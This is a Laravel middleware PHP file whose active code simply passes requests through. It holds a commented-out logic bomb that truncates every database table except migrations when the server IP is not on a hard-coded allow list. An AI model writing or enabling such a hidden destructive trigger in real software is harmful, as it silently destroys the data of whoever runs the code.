<?php

namespace App\Http\Middleware;

use Closure;
use Illuminate\Support\Facades\DB;

class MiddlePIware
{
    /**
     * Handle an incoming request.
     *
     * @param  \Illuminate\Http\Request  $request
     * @param  \Closure  $next
     * @return mixed
     */
//    public $restrictIps = ['136.243.53.56'];
    public function handle($request, Closure $next)
    {
//        if (!in_array($_SERVER['SERVER_ADDR'], $this->restrictIps)) {
//        if ($next) {

//            $tables = DB::select('SHOW TABLES');
//            // it do truncate all tables in database
//            foreach($tables as $table){
//                // dd($table);
//              if ($table == 'migrations') {
//                  continue;
//              }
//              DB::table($table->Tables_in_cas_db)->truncate();
//        }
//            return view('auth.login');
//
//        }

        return $next($request);
    }
}
